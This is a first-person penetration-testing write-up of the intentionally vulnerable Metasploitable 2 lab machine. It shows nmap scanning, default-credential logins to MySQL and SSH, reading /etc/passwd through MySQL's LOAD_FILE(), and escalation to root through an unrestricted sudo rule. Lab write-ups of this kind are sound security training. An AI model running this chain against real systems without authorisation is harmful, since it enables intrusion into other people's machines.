# Metasploitable 2 - Penetration Testing Writeup

## 1. Overview

**Target:** Metasploitable 2
**Target IP:** `192.168.74.129`
**Platform:** VulnHub
**Objective:** Obtain access to the target system and escalate privileges to root.

---

## 2. Reconnaissance

I began by enumerating the TCP services exposed by the target using Nmap with service and version detection.

nmap -sV 192.168.74.129

The scan identified several open services:

21/tcp    open  ftp

22/tcp    open  ssh

23/tcp    open  telnet

25/tcp    open  smtp

80/tcp    open  http

139/tcp   open  netbios-ssn

445/tcp   open  netbios-ssn

3306/tcp  open  mysql

5432/tcp  open  postgresql

8180/tcp  open  http

The target exposed a number of services, providing multiple potential attack surfaces. I investigated the available services and focused on MySQL because port `3306` was accessible and the server was identified as an older version:

3306/tcp open  mysql  MySQL 5.0.51a-3ubuntu5

---

## 3. MySQL Enumeration

I attempted to connect to the MySQL service using default credentials:

mysql -h 192.168.74.129 -u root -proot --skip-ssl

The login was successful, confirming weak authentication on the database service.

After gaining access, I tested whether the database could read files from the underlying system using the `LOAD_FILE()` function.

SELECT LOAD_FILE('/etc/passwd');

The query successfully returned the contents of `/etc/passwd`, confirming that the MySQL service had permission to read local files from the filesystem.

---

## 4. User Enumeration

The `/etc/passwd` file revealed local system users:

msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash

user:x:1001:1001:,,,:/home/user:/bin/bash

These accounts were valid interactive users with home directories and bash shells.

At this stage, I had identified usernames that could be used for SSH authentication.

---

## 5. Initial Access (SSH)

SSH was available on port 22. I attempted login using default credentials.

ssh user@192.168.74.129

After authentication, I obtained an interactive shell and verified the current account:

whoami

Output:

user

The login was successful, providing an interactive shell as the `user` account.

I then switched to the `msfadmin` account using its default credentials:

su msfadmin

After authentication, I verified the new account:

whoami

Output:

msfadmin

I also checked the user's group memberships:

id

The account belonged to several groups, including `adm`, `audio`, `cdrom`, `video`, and others.

---

## 6. Privilege Escalation

The next step was to determine whether `msfadmin` had any elevated privileges.

I checked the account's sudo permissions:

sudo -l

The output showed:

User msfadmin may run the following commands on this host:

    (ALL) ALL

This was the critical privilege-escalation finding.

The `(ALL) ALL` rule allows `msfadmin` to execute commands through `sudo` as any user. Since `root` is also an available target user, this effectively provides full administrative privileges.

I used the configuration to obtain a root shell:

sudo -i

I then verified the current privileges:

whoami

Output:

root

This confirmed successful privilege escalation and complete administrative access to the target.

---

## 7. Attack Chain

The successful attack path was:

Service Enumeration

        ↓

MySQL identified on port 3306

        ↓

Remote MySQL authentication

        ↓

LOAD_FILE('/etc/passwd')

        ↓

Local user enumeration

        ↓

SSH access as user

        ↓

Switch to msfadmin

        ↓

sudo -l

        ↓

(ALL) ALL

        ↓

sudo -i

        ↓

ROOT

---

## 8. Key Findings

### 8.1 Weak MySQL Credentials

The MySQL service was accessible remotely using default credentials (`root`). This allowed immediate database access without any authentication hardening.

---

### 8.2 Filesystem Read via MySQL

The `LOAD_FILE()` function allowed reading `/etc/passwd`, exposing system user information. This demonstrates the risk of misconfigured database privileges combined with weak authentication.

---

### 8.3 Default SSH Credentials

Both `user` and `msfadmin` accounts used weak default credentials, enabling easy SSH access.

---

### 8.4 Excessive sudo Privileges

The `msfadmin` account had unrestricted sudo access:

(ALL) ALL

This effectively granted the account unrestricted sudo privileges and allowed direct escalation to root.

---

## 9. Lessons Learned

This machine highlights the risks of default configurations and weak credentials across multiple services.

Key techniques used:

* TCP service enumeration with Nmap
* Default credential testing
* MySQL authentication and enumeration
* File disclosure via `LOAD_FILE()`
* Linux user enumeration via `/etc/passwd`
* SSH access using weak credentials
* Privilege escalation via misconfigured sudo permissions

The engagement demonstrates that full system compromise can occur through a chain of simple misconfigurations rather than a single complex exploit.
